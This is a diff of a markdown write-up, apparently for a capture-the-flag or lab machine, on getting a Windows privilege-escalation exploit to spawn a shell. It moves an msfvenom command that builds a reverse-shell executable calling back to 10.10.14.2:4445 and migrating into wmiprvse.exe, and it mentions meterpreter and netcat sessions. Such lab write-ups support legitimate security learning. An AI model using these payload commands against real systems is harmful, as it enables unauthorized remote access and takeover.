@@ -204,11 +204,10 @@ BOOL WINAPI CreateNewCmdProcess (STARTUPINFO *startupInformation, PROCESS_INFORM
 
 ```
 
-MSFVenom reverse shell.
-`msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.2 lport=4445 prependmigrate=true prependmigrateproc=wmiprvse.exe -f exe -o revshell.exe`
-
 The third method I tried involves using `msfvenom` to generate a reverse shell binary. When I tested with staged and stageless payloads, the result is still that the session dies upon connecting back to us. Even when testing with metasploit's `multi/handler` instead of netcat. After some playing with some options, I found that setting `PrependMigrate` to `true` somewhat fixes the issue.
 
+
+`msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.2 lport=4445 prependmigrate=true prependmigrateproc=wmiprvse.exe -f exe -o revshell.exe`
 ```
 BOOL WINAPI CreateNewCmdProcess (STARTUPINFO *startupInformation, PROCESS_INFORMATION *processInformation)
 {
@@ -234,3 +233,7 @@ BOOL WINAPI CreateNewCmdProcess (STARTUPINFO *startupInformation, PROCESS_INFORM
 ```
 
 Now there is still that final issue: the exploit doesn't launch our executable. Or at least that's what I can tell. What's interesting is that executing the exploit with meterpreter's `execute -f ` function gives us a system shell as expected. But running the exploit via cmd just hangs our shell.
+
+![rootshell](images/rootnetcat.png)
+
+
